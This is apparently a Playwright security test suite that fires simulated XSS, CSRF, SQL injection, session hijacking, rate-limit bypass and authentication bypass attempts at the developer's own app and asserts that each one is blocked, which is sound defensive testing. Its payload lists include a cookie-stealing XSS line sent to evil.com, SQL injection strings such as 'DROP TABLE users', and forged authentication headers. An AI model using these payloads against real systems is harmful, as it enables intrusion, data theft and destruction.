import { expect, test } from '@playwright/test'

/**
 * ATTACK SIMULATION AND SECURITY TESTING
 *
 * Portfolio demonstration of real-world attack simulation using Playwright
 * Tests security defenses against common attack vectors including:
 * - XSS (Cross-Site Scripting) attacks
 * - CSRF (Cross-Site Request Forgery) attacks
 * - SQL Injection attempts
 * - Session hijacking scenarios
 * - Rate limiting bypass attempts
 * - Authentication bypass attempts
 */

test.describe('Attack Simulation Security Testing', () => {
  let attackTestResults: Array<{
    attackType: string
    attackVector: string
    blocked: boolean
    severity: 'critical' | 'high' | 'medium' | 'low'
    details: string
  }>

  test.beforeEach(async () => {
    attackTestResults = []
  })

  test('XSS Attack Simulation', async ({ page }) => {
    console.log('⚠️ Simulating XSS Attacks')

    // XSS payloads for testing
    const xssPayloads = [
      {
        name: 'Basic Script Injection',
        payload: '<script>alert("XSS")</script>',
        severity: 'high' as const,
      },
      {
        name: 'Image XSS',
        payload: '<img src="x" onerror="alert(\'XSS\')" />',
        severity: 'high' as const,
      },
      {
        name: 'SVG XSS',
        payload: '<svg onload="alert(\'XSS\')">',
        severity: 'high' as const,
      },
      {
        name: 'JavaScript URL',
        payload: 'javascript:alert("XSS")',
        severity: 'medium' as const,
      },
      {
        name: 'Event Handler XSS',
        payload: '" onmouseover="alert(\'XSS\')" "',
        severity: 'high' as const,
      },
      {
        name: 'HTML Entity Encoded',
        payload: '&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;',
        severity: 'medium' as const,
      },
      {
        name: 'Cookie Stealing XSS',
        payload:
          '<script>document.location="http://evil.com/steal.php?cookie="+document.cookie</script>',
        severity: 'critical' as const,
      },
    ]

    await page.goto('/')

    // Test XSS in search functionality
    for (const xssTest of xssPayloads) {
      console.log(`🔍 Testing: ${xssTest.name}`)

      // Look for search input
      const searchInput = page
        .locator('input[type="search"], [data-testid*="search"], [placeholder*="search" i]')
        .first()

      if (await searchInput.isVisible()) {
        // Fill search input with XSS payload
        await searchInput.fill(xssTest.payload)
        await page.keyboard.press('Enter')

        // Wait for any potential script execution
        await page.waitForTimeout(1000)

        // Check if XSS was executed
        const xssExecuted = await page.evaluate(() => {
          // Check for various indicators of XSS execution
          return (
            window.location.href.includes('alert') ||
            document.body.innerHTML.includes('<script>') ||
            document.body.innerHTML.includes('javascript:') ||
            !!window.xssExecuted // Custom flag that might be set by payload
          )
        })

        const blocked = !xssExecuted

        attackTestResults.push({
          attackType: 'XSS',
          attackVector: xssTest.name,
          blocked,
          severity: xssTest.severity,
          details: blocked ? 'XSS payload blocked successfully' : 'XSS payload executed!',
        })

        expect(xssExecuted).toBeFalsy()
        console.log(`${blocked ? '✅' : '❌'} ${xssTest.name}: ${blocked ? 'Blocked' : 'Executed'}`)

        // Clear the input for next test
        await searchInput.clear()
      }
    }

    // Test XSS in URL parameters
    for (const xssTest of xssPayloads) {
      const encodedPayload = encodeURIComponent(xssTest.payload)

      try {
        await page.goto(`/?search=${encodedPayload}`)
        await page.waitForTimeout(500)

        const xssExecuted = await page.evaluate(() => {
          return (
            document.body.innerHTML.includes('<script>') ||
            document.body.innerHTML.includes('javascript:')
          )
        })

        const blocked = !xssExecuted

        attackTestResults.push({
          attackType: 'XSS URL Parameter',
          attackVector: xssTest.name,
          blocked,
          severity: xssTest.severity,
          details: blocked ? 'URL XSS blocked' : 'URL XSS executed',
        })

        expect(xssExecuted).toBeFalsy()
      } catch (_error) {
        // Error in navigation might indicate blocking
        attackTestResults.push({
          attackType: 'XSS URL Parameter',
          attackVector: xssTest.name,
          blocked: true,
          severity: xssTest.severity,
          details: 'XSS blocked by navigation error',
        })
      }
    }

    await page.screenshot({
      path: 'test-results/attack-simulation/xss-testing.png',
      fullPage: true,
    })

    console.log('✅ XSS Attack Simulation completed')
  })

  test('CSRF Attack Simulation', async ({ page, context }) => {
    console.log('🔒 Simulating CSRF Attacks')

    await page.goto('/auth/signin')

    // Get CSRF token
    const csrfResponse = await page.request.get('/api/auth/csrf')
    const csrfData = await csrfResponse.json()
    const validCsrfToken = csrfData.csrfToken

    // Test 1: Valid CSRF token
    const validCSRFTest = await page.request.post('/api/auth/signout', {
      data: { csrfToken: validCsrfToken },
    })

    attackTestResults.push({
      attackType: 'CSRF Valid Token',
      attackVector: 'Legitimate request with valid CSRF token',
      blocked: false,
      severity: 'low',
      details: `Valid CSRF request: ${validCSRFTest.status()}`,
    })

    // Test 2: Missing CSRF token
    const missingCSRFTest = await page.request.post('/api/auth/signout', {
      data: {},
    })

    const missingCSRFBlocked = [400, 403, 422].includes(missingCSRFTest.status())

    attackTestResults.push({
      attackType: 'CSRF Missing Token',
      attackVector: 'Request without CSRF token',
      blocked: missingCSRFBlocked,
      severity: 'high',
      details: `Missing CSRF token response: ${missingCSRFTest.status()}`,
    })

    expect(missingCSRFBlocked).toBeTruthy()

    // Test 3: Invalid CSRF token
    const invalidCSRFTest = await page.request.post('/api/auth/signout', {
      data: { csrfToken: 'invalid-token-12345' },
    })

    const invalidCSRFBlocked = [400, 403, 422].includes(invalidCSRFTest.status())

    attackTestResults.push({
      attackType: 'CSRF Invalid Token',
      attackVector: 'Request with forged CSRF token',
      blocked: invalidCSRFBlocked,
      severity: 'high',
      details: `Invalid CSRF token response: ${invalidCSRFTest.status()}`,
    })

    expect(invalidCSRFBlocked).toBeTruthy()

    // Test 4: Cross-origin CSRF simulation
    const crossOriginCSRF = await page.request.post('/api/auth/signout', {
      headers: {
        Origin: 'https://malicious-site.com',
        Referer: 'https://malicious-site.com/attack.html',
      },
      data: { csrfToken: validCsrfToken },
    })

    const crossOriginBlocked = [400, 403, 422].includes(crossOriginCSRF.status())

    attackTestResults.push({
      attackType: 'CSRF Cross-Origin',
      attackVector: 'Cross-origin request with valid token',
      blocked: crossOriginBlocked,
      severity: 'critical',
      details: `Cross-origin CSRF response: ${crossOriginCSRF.status()}`,
    })

    console.log('✅ CSRF Attack Simulation completed')
  })

  test('SQL Injection Attack Simulation', async ({ page }) => {
    console.log('💉 Simulating SQL Injection Attacks')

    const sqlPayloads = [
      {
        name: 'Basic SQL Injection',
        payload: "'; DROP TABLE users; --",
        severity: 'critical' as const,
      },
      {
        name: 'Union-based SQL Injection',
        payload: "' UNION SELECT * FROM users--",
        severity: 'critical' as const,
      },
      {
        name: 'Boolean-based Blind SQL Injection',
        payload: "' OR '1'='1",
        severity: 'high' as const,
      },
      {
        name: 'Time-based Blind SQL Injection',
        payload: "'; WAITFOR DELAY '00:00:05'--",
        severity: 'high' as const,
      },
      {
        name: 'Error-based SQL Injection',
        payload:
          "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        severity: 'high' as const,
      },
      {
        name: 'Authentication Bypass',
        payload: "admin'--",
        severity: 'critical' as const,
      },
    ]

    // Test SQL injection in search API
    for (const sqlTest of sqlPayloads) {
      console.log(`🔍 Testing: ${sqlTest.name}`)

      const startTime = Date.now()
      const response = await page.request.get(
        `/api/search/repositories?q=${encodeURIComponent(sqlTest.payload)}`
      )
      const responseTime = Date.now() - startTime

      let blocked = true
      let details = 'SQL injection blocked'

      if (response.status() === 200) {
        const responseText = await response.text()
        const lowerResponse = responseText.toLowerCase()

        // Check for SQL error messages that indicate injection
        const sqlErrors = [
          'sql syntax',
          'mysql error',
          'postgresql error',
          'oracle error',
          'database error',
          'syntax error',
          'table',
          'column',
          'union',
          'select',
          'from',
          'where',
        ]

        const hasErrorMessage = sqlErrors.some(error => lowerResponse.includes(error))

        if (hasErrorMessage) {
          blocked = false
          details = 'SQL injection may have been successful - error messages exposed'
        } else {
          details = 'SQL injection blocked - no error messages exposed'
        }

        // Check for unusual response times (potential time-based injection)
        if (sqlTest.name.includes('Time-based') && responseTime > 4000) {
          blocked = false
          details = `Potential time-based SQL injection - response time: ${responseTime}ms`
        }
      } else {
        details = `SQL injection blocked - HTTP ${response.status()}`
      }

      attackTestResults.push({
        attackType: 'SQL Injection',
        attackVector: sqlTest.name,
        blocked,
        severity: sqlTest.severity,
        details,
      })

      expect(blocked).toBeTruthy()
      console.log(`${blocked ? '✅' : '❌'} ${sqlTest.name}: ${details}`)
    }

    await page.screenshot({
      path: 'test-results/attack-simulation/sql-injection-testing.png',
      fullPage: true,
    })

    console.log('✅ SQL Injection Attack Simulation completed')
  })

  test('Session Security Attack Simulation', async ({ page, context }) => {
    console.log('🍪 Simulating Session Security Attacks')

    await page.goto('/auth/signin')

    // Test 1: Session fixation attack simulation
    const originalCookies = await context.cookies()
    const sessionCookiesBefore = originalCookies.filter(
      c => c.name.includes('session') || c.name.includes('auth')
    )

    // Simulate login (this would normally create a new session)
    await page.request.get('/api/auth/session')

    const newCookies = await context.cookies()
    const sessionCookiesAfter = newCookies.filter(
      c => c.name.includes('session') || c.name.includes('auth')
    )

    // Session should be regenerated on authentication
    const sessionRegenerated =
      sessionCookiesAfter.length !== sessionCookiesBefore.length ||
      sessionCookiesAfter.some(
        after => !sessionCookiesBefore.some(before => before.value === after.value)
      )

    attackTestResults.push({
      attackType: 'Session Fixation',
      attackVector: 'Session ID reuse attack',
      blocked: sessionRegenerated,
      severity: 'high',
      details: sessionRegenerated
        ? 'Session properly regenerated'
        : 'Session fixation vulnerability',
    })

    // Test 2: Cookie security attributes
    sessionCookiesAfter.forEach(cookie => {
      const hasSecureAttributes =
        cookie.httpOnly &&
        ['Lax', 'Strict'].includes(cookie.sameSite) &&
        (page.url().startsWith('http://') || cookie.secure)

      attackTestResults.push({
        attackType: 'Session Cookie Security',
        attackVector: `Cookie: ${cookie.name}`,
        blocked: hasSecureAttributes,
        severity: 'medium',
        details: `HttpOnly: ${cookie.httpOnly}, SameSite: ${cookie.sameSite}, Secure: ${cookie.secure}`,
      })

      expect(hasSecureAttributes).toBeTruthy()
    })

    // Test 3: Session hijacking simulation
    const stolenCookies = sessionCookiesAfter.map(cookie => ({
      ...cookie,
      url: page.url(),
    }))

    // Create new context with stolen cookies
    const attackerContext = await page.context().browser()?.newContext()
    if (attackerContext) {
      await attackerContext.addCookies(stolenCookies)
      const attackerPage = await attackerContext.newPage()

      try {
        // Try to access protected resource with stolen session
        const hijackResponse = await attackerPage.request.get('/api/auth/session')

        // This should either work (if session is valid) or fail (if additional protections exist)
        const hijackBlocked = hijackResponse.status() !== 200

        attackTestResults.push({
          attackType: 'Session Hijacking',
          attackVector: 'Stolen cookie reuse',
          blocked: hijackBlocked,
          severity: 'critical',
          details: `Session hijack attempt: HTTP ${hijackResponse.status()}`,
        })

        await attackerPage.close()
      } finally {
        await attackerContext.close()
      }
    }

    console.log('✅ Session Security Attack Simulation completed')
  })

  test('Rate Limiting Bypass Attempts', async ({ page }) => {
    console.log('🚦 Simulating Rate Limiting Bypass Attacks')

    const endpoints = [
      { path: '/api/auth/session', limit: 10 },
      { path: '/api/auth/csrf', limit: 10 },
      { path: '/api/search/repositories?q=test', limit: 15 },
    ]

    for (const endpoint of endpoints) {
      console.log(`🔍 Testing rate limiting for: ${endpoint.path}`)

      // Test 1: Basic rate limiting
      const requests = []
      const startTime = Date.now()

      for (let i = 0; i < endpoint.limit + 5; i++) {
        requests.push(page.request.get(endpoint.path))
      }

      const responses = await Promise.all(requests)
      const endTime = Date.now()

      const statusCodes = responses.map(r => r.status())
      const rateLimited = responses.some(r => r.status() === 429)
      const responseTime = endTime - startTime

      attackTestResults.push({
        attackType: 'Rate Limiting',
        attackVector: `Rapid requests to ${endpoint.path}`,
        blocked: rateLimited,
        severity: 'medium',
        details: `${responses.length} requests in ${responseTime}ms, status codes: ${[...new Set(statusCodes)].join(',')}`,
      })

      console.log(
        `${rateLimited ? '✅' : '⚠️'} Rate limiting ${rateLimited ? 'active' : 'not detected'} for ${endpoint.path}`
      )

      // Test 2: Rate limiting bypass attempts
      await page.waitForTimeout(1000) // Brief pause

      // Try different User-Agent
      const bypassAttempt1 = await page.request.get(endpoint.path, {
        headers: {
          'User-Agent': 'Different-Bot/1.0',
        },
      })

      // Try different IP simulation (X-Forwarded-For)
      const bypassAttempt2 = await page.request.get(endpoint.path, {
        headers: {
          'X-Forwarded-For': '192.168.1.100',
          'X-Real-IP': '192.168.1.100',
        },
      })

      const bypassBlocked = [bypassAttempt1, bypassAttempt2].every(
        r => [200, 429].includes(r.status()) // Should either work normally or be rate limited
      )

      attackTestResults.push({
        attackType: 'Rate Limiting Bypass',
        attackVector: 'Header manipulation bypass attempt',
        blocked: bypassBlocked,
        severity: 'medium',
        details: `Bypass attempts: ${bypassAttempt1.status()}, ${bypassAttempt2.status()}`,
      })
    }

    await page.screenshot({
      path: 'test-results/attack-simulation/rate-limiting-testing.png',
      fullPage: true,
    })

    console.log('✅ Rate Limiting Bypass Attack Simulation completed')
  })

  test('Authentication Bypass Attempts', async ({ page }) => {
    console.log('🔐 Simulating Authentication Bypass Attacks')

    const protectedEndpoints = [
      '/api/admin',
      '/api/user/profile',
      '/api/settings',
      '/dashboard',
      '/admin',
    ]

    for (const endpoint of protectedEndpoints) {
      console.log(`🔍 Testing authentication bypass for: ${endpoint}`)

      // Test 1: Direct access without authentication
      const directAccess = await page.request.get(endpoint)
      const directBlocked = [401, 403, 302].includes(directAccess.status())

      attackTestResults.push({
        attackType: 'Authentication Bypass',
        attackVector: `Direct access to ${endpoint}`,
        blocked: directBlocked,
        severity: 'critical',
        details: `Direct access response: HTTP ${directAccess.status()}`,
      })

      // Test 2: Header manipulation attempts
      const headerBypassAttempts = [
        { 'X-Authenticated': 'true' },
        { Authorization: 'Bearer fake-token' },
        { 'X-User-ID': '1' },
        { 'X-Admin': 'true' },
        { 'X-Forwarded-User': 'admin' },
      ]

      for (const headers of headerBypassAttempts) {
        const bypassAttempt = await page.request.get(endpoint, { headers })
        const bypassBlocked = [401, 403, 302].includes(bypassAttempt.status())

        attackTestResults.push({
          attackType: 'Header Authentication Bypass',
          attackVector: `Header bypass: ${Object.keys(headers)[0]}`,
          blocked: bypassBlocked,
          severity: 'high',
          details: `Header bypass response: HTTP ${bypassAttempt.status()}`,
        })

        expect(bypassBlocked).toBeTruthy()
      }

      // Test 3: Path traversal attempts
      const pathTraversalAttempts = [
        `${endpoint}/../`,
        `${endpoint}/./`,
        `${endpoint}%2E%2E/`,
        `${endpoint}%00`,
      ]

      for (const path of pathTraversalAttempts) {
        try {
          const traversalAttempt = await page.request.get(path)
          const traversalBlocked = [401, 403, 404].includes(traversalAttempt.status())

          attackTestResults.push({
            attackType: 'Path Traversal Bypass',
            attackVector: `Path traversal: ${path}`,
            blocked: traversalBlocked,
            severity: 'medium',
            details: `Path traversal response: HTTP ${traversalAttempt.status()}`,
          })
        } catch (_error) {
          // Error indicates path was blocked
          attackTestResults.push({
            attackType: 'Path Traversal Bypass',
            attackVector: `Path traversal: ${path}`,
            blocked: true,
            severity: 'medium',
            details: 'Path traversal blocked by navigation error',
          })
        }
      }

      expect(directBlocked).toBeTruthy()
    }

    console.log('✅ Authentication Bypass Attack Simulation completed')
  })

  test.afterEach(async ({ page }, testInfo) => {
    // Generate attack simulation report
    console.log('\n⚔️ ATTACK SIMULATION RESULTS')
    console.log('═'.repeat(60))
    console.log(`Test: ${testInfo.title}`)
    console.log(`Status: ${testInfo.status}`)

    const attacksByType = attackTestResults.reduce(
      (acc, result) => {
        if (!acc[result.attackType]) {
          acc[result.attackType] = { total: 0, blocked: 0, failed: 0 }
        }
        acc[result.attackType].total++
        if (result.blocked) {
          acc[result.attackType].blocked++
        } else {
          acc[result.attackType].failed++
        }
        return acc
      },
      {} as Record<string, { total: number; blocked: number; failed: number }>
    )

    console.log('\nAttack Test Summary:')
    Object.entries(attacksByType).forEach(([attackType, stats]) => {
      const blockRate = ((stats.blocked / stats.total) * 100).toFixed(1)
      const status = stats.failed === 0 ? '✅' : '❌'
      console.log(
        `  ${status} ${attackType}: ${stats.blocked}/${stats.total} blocked (${blockRate}%)`
      )
    })

    // Critical findings
    const criticalFailures = attackTestResults.filter(
      r => !r.blocked && (r.severity === 'critical' || r.severity === 'high')
    )

    if (criticalFailures.length > 0) {
      console.log('\n🚨 CRITICAL SECURITY ISSUES:')
      criticalFailures.forEach(failure => {
        console.log(`  ❌ ${failure.attackType} - ${failure.attackVector}`)
        console.log(`     ${failure.details}`)
      })
    } else {
      console.log('\n✅ NO CRITICAL SECURITY VULNERABILITIES DETECTED')
    }

    // Overall security score
    const totalTests = attackTestResults.length
    const passedTests = attackTestResults.filter(r => r.blocked).length
    const securityScore = totalTests > 0 ? ((passedTests / totalTests) * 100).toFixed(1) : '100'

    console.log(`\n🛡️ OVERALL SECURITY SCORE: ${securityScore}%`)
    console.log('═'.repeat(60))

    if (testInfo.status === 'failed') {
      await page.screenshot({
        path: `test-results/attack-simulation/failure-${testInfo.title.replace(/[^a-zA-Z0-9]/g, '-')}.png`,
        fullPage: true,
      })
    }
  })
})
